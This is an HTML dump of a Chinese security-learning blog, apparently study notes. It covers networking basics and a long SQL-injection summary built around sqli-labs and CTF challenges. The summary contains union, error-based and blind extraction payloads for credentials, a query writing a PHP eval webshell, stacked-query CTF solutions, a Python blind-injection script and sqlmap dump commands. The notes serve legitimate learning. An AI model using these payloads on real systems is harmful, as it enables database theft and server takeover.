+<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看源代码，发现采用了白名单过滤，规定了传入的文件只能是这几个，那么就杜绝了文件包含漏洞</p>
+<h2 id="交换机和路由器"><a href="#交换机和路由器" class="headerlink" title="交换机和路由器"></a>交换机和路由器</h2><p>1、交换机是用来组建局域网最重要的设备(一个圈打个叉)<br>2、路由器可以让这个局域网(内网)上网，实现连接内网和外网(长方形两条横线)<br>3、交换机、网线、电脑构成局域网<br><img src="/./img/176.png"><br>上面那个是交换机，下面是电脑的网卡插着网线连接着交换机<br>如果这个局域网需要可以上网就需要买路由器,路由器一端连交换机一端连运营商而这几台电脑之间需要能通信就需要有ip地址<br>这里是VMware提供的虚拟交换机<br><img src="/./img/177.png"><br>如果我勾选VMnet1相当于我的虚拟机的网卡连上了交换机，如果另一台虚拟机也连这个交换机就可以做局域网实验<br>IP可以手动配也可以自动，但是企业的ip一般是手动配的不会变</p>
+<h2 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h2><p>ip地址就是一个唯一标识，是一段网络编码(二进制)，由32位组成<br>11010010.01001001.10001100.00000110<br>210.73.140.6(便于记忆这样写)<br>常用ip地址都是由32位二进制组成的，最大的ip地址是255.255.255.255最小的ip地址是0.0.0.0</p>
+<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>有ip的地方必须有子网掩码</p>
+<ul>
+<li>局域网通信规则：在同一个局域网中，所有的ip必须在同一个网段中才可以互相通信，所以在不同的网段需要路由器才能通信，单单有交换机不行</li>
+<li>ip地址的构成：网络位+主机位(网络位相同的ip地址为同一个网段)类比你来自哪里，你叫什么网络位可以是前一位两位三位，而子网掩码就是来确认网络位的，在子网掩码中与255对应的是网络位，与0对应的是主机位，比如255.0.0.0就是将第一个小数点前作为网络位，255和0都是连续的不会出现交替</li>
+<li>每个网段的总称是将ip的主机位置零，表示这个网段<br>eg：<br>ip：10.1.1.1<br>子网掩码：255.255.255.0<br>这个网段表示为10.1.1.0，该网段的广播地址是10.1.1.255，广播地址是指可以直接向这个网段的所有ip地址发送东西，可以视为组播地址的升级版，是该网段的<br>大喇叭，255.255.255.255是全局广播地址，可以向所有网段发送信息，但是现在一些地区已经做了隔断。所有可用地址有254个，除去<strong>主机位全为</strong>0或255的</li>
+</ul>
+<h2 id="IP地址分类-看第一部分区分"><a href="#IP地址分类-看第一部分区分" class="headerlink" title="IP地址分类(看第一部分区分)"></a>IP地址分类(看第一部分区分)</h2><p>国际标准组织ISO定义地址分类：五大类(是以ip地址的第一位区分)</p>
+<blockquote>
+<p>A类：1-126 默认子网掩码：255.0.0.0<br>B类：128-191 默认子网掩码：255.255.0.0<br>C类：192-223 默认子网掩码：255.255.255.0<br>D类：224-239 组播地址<br>E类：240-254 科研使用</p>
+</blockquote>
+<p>这样的定义年代久远了，已经不一定使用默认子网掩码，普通人只能使用前三类，子网掩码可以修改<br>127.0.0.1是回环地址，代表本主机自己，经常用来测试将自己的主机作为服务器是否故障，就ping 127.0.0.1看看是否可以访问</p>
+<p><strong>组播技术</strong><br>和组播地址相对应的是单播地址，就是一个人一个地址，但组播地址就可以给一组人使用，将一组ip地址视为是同一个组播地址，发东西只发给这个ip地址就相当于发给这一组ip地址，这样的组播技术可以节省服务器带宽</p>
+<h2 id="网关-GW"><a href="#网关-GW" class="headerlink" title="网关(GW)"></a>网关(GW)</h2><p>这个整体是内网<br><img src="/./img/176.png"></p>
+<p><img src="/./img/178.png"><br>电脑向别的ip地址发送信息时先会比较自己和对方是否在同一个网段，如果不在同一个网段就直接通过交换机发给对方；如果不在同一网段就得发给路由器，而一般每个网段的第一个或最后一个可用的ip地址作为网关，网关就是整个内网的出口，是通向外网的通道，所以只需要将信息发给网关，网关会去寻找要转发的对象(这里怎么转发就涉及到路由器原理了)。<br>这里的10.1.1.254就是网关,如果只需要在局域网中通信就只需要ip和子网掩码，如果要上网就必须配网关，如果不知道网关就无法和外界通信,一般网关在路由器上<br><img src="/./img/180.png"><br>这里就有配置默认网关<br><img src="/./img/179.png"><br>VM开头的是虚拟的，一般网卡的牌子是realtek和Intel，所以属于我物理机的是以太网</p>
+<h2 id="DNS-域名解析服务器"><a href="#DNS-域名解析服务器" class="headerlink" title="DNS(域名解析服务器)"></a>DNS(域名解析服务器)</h2><p>任何两个PC通信都需要知道对方的ip，当在浏览器上地址栏输入<code>www.jd.com</code>浏览器会先问问自己，即查看有没有匹配的DNS缓存，但如果从来没有访问过就先在本地域名解析文件(host文件)中寻找，如果还没有就求助DNS服务器，所以电脑需要知道DNS服务器的IP，DNS的服务器分布于全球各地，DNS的ip是在公网(互联网)上<br>这里是电脑里的相关配置，这个DNS服务器是北京联通的最通用的一台DNS<br><img src="/./img/181.png"><br>访问过程<br><img src="/./img/182.png"><br>如果所使用的DNS服务器被劫持，使我们输入的域名解析成恶意网站就很危险<br><strong>一些网络测试命令</strong></p>
+<ul>
+<li>ping 测试网络连通性，有去有回，相当于发过去几个探测包，对方有回包<br>这里的时间可以反映网速，如果对方打开防火墙的某些功能也会ping不通<br><img src="/./img/183.png"> </li>
+<li>nslookup 域名(比如<code>www.baidu.com</code>)，手工解析ip地址</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html" itemprop="url">sql注入总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-30T23:56:39+08:00">
+                2023-05-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行<br><img src="/img/203.png"></p>
+<h2 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h2><p><img src="/img/204.png"><br>mysql的版本5.0以上才有information_schema数据库</p>
+<ul>
+<li>信息收集：<br>查询数据库 version()<br>数据库名字 databaase()<br>数据库用户 user()<br>操作系统 @@version_compile_os</li>
+</ul>
+<p>跨库查询：目标网站的同一个服务器中如果存在一个网站的数据库是使用root权限连接的，且存在sql注入漏洞，就会有被跨库攻击的风险。数据库名存放在information_schema.schemata表中的schema_name字段，查询方式和查表名一致</p>
+<h2 id="关于mysql"><a href="#关于mysql" class="headerlink" title="关于mysql"></a>关于mysql</h2><p>mysql有个自带的数据库：information_schema，该数据库下面有表：tables和columns和schemata。<br>tables表中有个字段：table_name 是所有数据库存在的表名<br>columns表中有个字段：column_name 是所有列名<br>schemata表中：schema_name 是所有数据库名</p>
+<h2 id="注入点类型判断"><a href="#注入点类型判断" class="headerlink" title="注入点类型判断"></a>注入点类型判断</h2><ul>
+<li>数字型</li>
+<li>字符型<br><strong>数字型判断</strong><br>当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：<br><code>select * from &lt;表名&gt; where id = x</code><br>这种类型可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断：</li>
+<li>Url 地址中输入<code>/abc.php?id= x and 1=1 </code>页面依旧运行正常</li>
+<li>Url 地址中继续输入 <code>/abc.php?id= x and 1=2 </code>页面运行错误，则说明此 Sql 注入为数字型注入。</li>
+</ul>
+<p>原因如下：<br>当输入 <code>and 1=1</code>时，后台执行 Sql 语句：<br><code>select * from &lt;表名&gt; where id = x and 1=1</code><br>没有语法错误且逻辑判断为正确，所以返回正常<br>当输入 and 1&#x3D;2时，后台执行 Sql 语句：<br><code>select * from &lt;表名&gt; where id = x and 1=2</code><br>没有语法错误但是逻辑判断为假，所以返回错误<br>我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：<br><code>select * from &lt;表名&gt; where id = &#39;x and 1=1&#39; </code><br><code>select * from &lt;表名&gt; where id = &#39;x and 1=2&#39;</code><br>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p>
+<p><strong>字符型判断</strong></p>
+<ul>
+<li>Url 地址中输入 <code>/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 </code>页面运行正常</li>
+<li>Url 地址中继续输入 <code>/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。<br>同样可以使用假设法来验证</li>
+</ul>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>以下是字符型的情况：<br><strong>1、判断列数</strong><br><code>?id=1&#39;order by 3 --+</code><br><strong>2、判断显示位，就是看哪一列会显示在屏幕上</strong><br><code>?id=-1&#39;union select 1,2,3--+</code><br><strong>3、数据库名</strong><br><code>?id=-1&#39;union select 1,database(),3--+</code><br><strong>4、该数据库下的表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><strong>5、待查表的字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><strong>6、数据</strong><br><code>?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+</code></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
+<li>updatexml()是更新xml文档的函数</li>
+</ul>
+<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)<br><code>updatexml(1,concat(0x7e,(select database()),0x7e),1)</code><br>实际上这里是去更新xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入了特殊字符，因为不符合输入规则所以报错，但是报错的时候其实已经执行了子查询语句，并从报错信息中显示出来</p>
+<p><strong>数据库名</strong><br><code>?id=1&#39; or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) --+</code><br><strong>表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+<p><strong>字段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+<p><strong>数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 0,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+<p>ps:</p>
+<ul>
+<li>报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()</li>
+<li>建议使用or，因为and如果两条语句有一条是false，就会判定为false，如果前面的条件不成立，后面的语句就不会执行<br><strong>报错注入显示不全问题解决</strong></li>
+</ul>
+<p>使用mid函数<br><code>?wllm=1&#39; or updatexml(1,concat(&#39;~&#39;,mid((select group_concat(flag) from test_tb),1,31),&#39;~&#39;),1) --+</code><br><code>?wllm=1&#39; or updatexml(1,concat(&#39;~&#39;,mid((select group_concat(flag) from test_tb),32,31),&#39;~&#39;),1) --+</code>用mid函数包含查询内容，第二个参数规定开始位置，第三个参数是返回的字符个数</p>
+<h2 id="写入读取文件"><a href="#写入读取文件" class="headerlink" title="写入读取文件"></a>写入读取文件</h2><p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有三个：<br>into dumpfile()、into outfile()、load_file()<br>这些都是需要设置secure_file_priv&#x3D;,如果为空则可以指定任意目录，如果有设置等于某个路径就只能在这个路径下写入，如果为null则禁止导入导出功能<br>可以往里面写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,&quot;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&quot;,3 into outfile &quot;D://phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/shell.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p>也可以直接把想要查询的内容导出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))  union select 1,2,group_concat(username, &quot;~&quot;,password) from users into outfile &quot;D://phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/outfile.txt&quot; --+</span><br></pre></td></tr></table></figure>
+<p>常见写入文件问题:魔术引号开关<br>magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线，影响文件路径<br>解决方式：16进制编码</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>没有显错位的时候可以尝试使用盲注的方式<br><strong>下面介绍一些盲注相关的函数</strong><br>length():返回字符串的长度<br>substr():截取字符串<br>ascii():返回字符的ascii码<br>sleep():将程序挂起一段时间<br>if(1,2,3):判断1成立就执行2，不成立就执行3</p>
+<p><strong>数据库长度</strong><br><code>?id=1&#39;and (length(database()))=1 --+</code></p>
+<p><strong>数据库名称</strong><br><code>?id=1&#39;and ascii(substr(database(),1,1))=100 --+</code></p>
+<p><strong>表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1,1))=117 --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))=105--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>可以使用字符判断也可以使用字符本身，每个字段名会被隔开，所以中间会有不在a~z范围内的，当然也可以一个一个查</p>
+<p><strong>数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>如果输入什么，页面回显都不变可以考虑使用时间盲注<br><strong>判断参数构造</strong><br><code>?id=1&#39; and if(1=1,sleep(5),1)--+</code></p>
+<p><strong>库名长度</strong><br><code>?id=1&#39;and if(length((select database()))=8,sleep(5),1)--+</code></p>
+<p><strong>数据库名称</strong><br><code>?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</code></p>
+<p><strong>表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select username from users),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h2><p>万能密码：’or 1&#x3D;1 #</p>
+<h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h3><p><strong>判断列数</strong><br><code>&#39; or 1=1 order by 3#</code><br><strong>判断显示位</strong><br><code>&#39; union select 1,2 #</code><br>后面和get型相同<br>‘union select 1,database()#  </p>
+<h2 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h2><p>数字型、字符型，括号尝试<br>搜索框中参数可能是<code>&#39;%查询%&#39;</code>这样的,所以要%的闭合</p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1’ and 1&#x3D;1 –+<br>1’ and 1&#x3D;2 –+<br>判断出存在sql注入<br>1’order by 3 –+ &#x2F;&#x2F;判断列数是2<br>1’union select 1,2 –+ &#x2F;&#x2F;尝试联合注入<br>回显内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+<p>尝试堆叠注入<br>1’;show databases; –+<br>由上面可知，extractvalue没有被过滤<br><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) --+</code> &#x2F;&#x2F;显示现在访问的数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : XPATH syntax error: &#x27;~supersqli~&#x27;</span><br></pre></td></tr></table></figure>
+<p>是flag所在的数据库，所以直接查看表名<br>0’; show tables; #<br>两个表：words、1919810931114514<br>1’; show columns from words; #<br>1’; show columns from <code>1919810931114514</code>; #  &#x2F;&#x2F;表名是数字的用反引号包裹<br>words:<br><img src="/img/197.png"><br>1919810931114514:<br><img src="/img/198.png"><br>我们需要读取的是第二个表内的flag字段的内容，所以思路是：<br>查询是在words中查询id的，所以我们将表1919810931114514改名为words，将words改名为其余的名字。同时将flag属性改名为id属性，类型为varchar(100)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);#</span><br></pre></td></tr></table></figure>
+
+<p>第二种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
+<p>在SQL语句中使用了一个变量@a，并将一个十六进制值赋给了这个变量，使用了prepare语句，将之前赋值给变量@a的十六进制值转换为可执行的SQL语句，执行之前准备好的SQL语句<br>prepare from是预处理语句，会进行编码转换<br>execute用来执行由SQLPrepare创建的SQL语句</p>
+<p>第三种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>
+<p>将表名1919810931114514通过别名a的方式打开，以别名a的形式读取下一条记录</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>输入1或2都有回显，输入其他的会显示error，那么先试一下万能密码<code>1&#39;or 1=1 #</code>,发现回显sql注入检查，所以是有过滤，fuzz测试一下<br><img src="/img/199.png"><br>这些长度一样的都是被过滤的，–+和#都被过滤了<br>输入1’,回显bool(false)，说明提示布尔盲注，两个新姿势：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(1=1,1,2):若第一个成立就指向第二个</span><br><span class="line">0^1：mysql里是亦或</span><br></pre></td></tr></table></figure>
+<p>空格被过滤，所以用()代替<br>然后就是编写脚本了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">url=&#x27;http://7b7b80d0-9cb2-4722-aaf7-b1c57e676401.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,43):  //range左边是不等于，所以循环42次</span><br><span class="line">    max = 127</span><br><span class="line">    min = 0</span><br><span class="line">    for c in range(0,127):  //理论上大于最多次二分查找就行</span><br><span class="line">        s = (int)((max+min)/2)  //转换为整数，直接舍去小数部分，用于下方的比较</span><br><span class="line">        payload = &#x27;0^(ascii(substr((select(flag)from(flag)),&#x27;+str(i)+&#x27;,1))&gt;&#x27;+str(s)+&#x27;)&#x27;  //str(i)转换为字符串，+是字符串拼接运算符</span><br><span class="line">        r = requests.post(url,data = &#123;&#x27;id&#x27;:payload&#125;)  //发送POST请求，其中id 是传递SQL注入负载的参数名</span><br><span class="line">        time.sleep(0.005)  //添加短暂的延迟，避免频繁请求导致触发安全机制</span><br><span class="line">        if &#x27;Hello, glzjin wants a girlfriend.&#x27; in str(r.content):  //响应内容通常以字节流（bytes）的形式返回，将其转换为字符串以便进行文本匹配和处理</span><br><span class="line">            min=s</span><br><span class="line">        else:</span><br><span class="line">            max=s</span><br><span class="line">        if((max-min)&lt;=1):</span><br><span class="line">            flag+=chr(max)  //转换为字符形式</span><br><span class="line">            print(flag)</span><br><span class="line">            break  </span><br></pre></td></tr></table></figure>
+
+
+
+<p>or updatexml(1,concat(‘<del>‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’fakebook’ ),’</del>‘),1)<br>?id&#x3D;1’ or updatexml(1,concat(‘<del>‘,(select group_conca(column_name) from information_schema.columns where table_schema&#x3D;’fakebook’and table_name&#x3D;’users’ ),’</del>‘),1) –+<br>or updatexml(1,concat(‘<del>‘,(select left(passwd,30) from users ),’</del>‘),1) –+</p>
+<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>1、查询数据库  sqltest<br>一定要跟上注入点的url<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; --current-db</code></p>
+<p>2、查数据表<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; -D sqltest --tables</code></p>
+<p>3、查数据列<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; -D sqltest -T admin --columns</code></p>
+<p>4、查数据<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqls/?id=2&quot; -D sqltest -T admin -C user,pwd --dump</code><br>&#x2F;&#x2F;–后面跟待查内容，current-db整体代表当前数据库，–batch：无交互行为</p>
+<p>NoSQLAttack是一个python编写的专门用于对MongoDB数据库进行SQL注入的渗透测试工具，非常简单好用，并且极大的弥补了sqlmap的不足（sqlmap不能对MongoDB数据库进行渗透）</p>
+<p>相关防注入：<br>自带防御:魔术引号<br>内置函数: int等<br>自定义关键字: select<br>WAF防护软件:安全狗，宝塔</p>
+<p>请求方式request既可以接收get也可以接收post<br><code>get、request、post、cookies、http头部($_SERVER全局变量)、json数据格式请求</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuazi/p/9765012.htmlv">$_SERVER用法</a><br>如果使用这个变量接收了用户的信息，并带入数据库查询，就可能存在注入漏洞<br><code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> &#x2F;&#x2F;当前请求的 User_Agent: 头部的内容,注入点在http请求头的User_Agent<br>json就是和参数&#x3D;值的表达类型不一样而已</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=1&#x27; and 1=1 &amp;b=1&amp;c=1</span><br><span class="line">json:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&quot;1 and 1=1&quot;</span><br><span class="line">    &quot;b&quot;:&quot;1&quot;</span><br><span class="line">    &quot;c&quot;:&quot;1&quot;</span><br><span class="line">&#125;    //不用考虑&quot;闭合，要看参数值的类型来猜测需不需要闭合&#x27; &quot;</span><br></pre></td></tr></table></figure>
+<p>SELECT * FROM users WHERE username&#x3D; ‘{$username}’,{是格式，只要闭合’</p>
+<h2 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h2><p>注入流程：<br><img src="/img/205.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/cookies%E3%80%81session%E3%80%81token.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/cookies%E3%80%81session%E3%80%81token.html" itemprop="url">cookies、session、token</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-27T22:34:26+08:00">
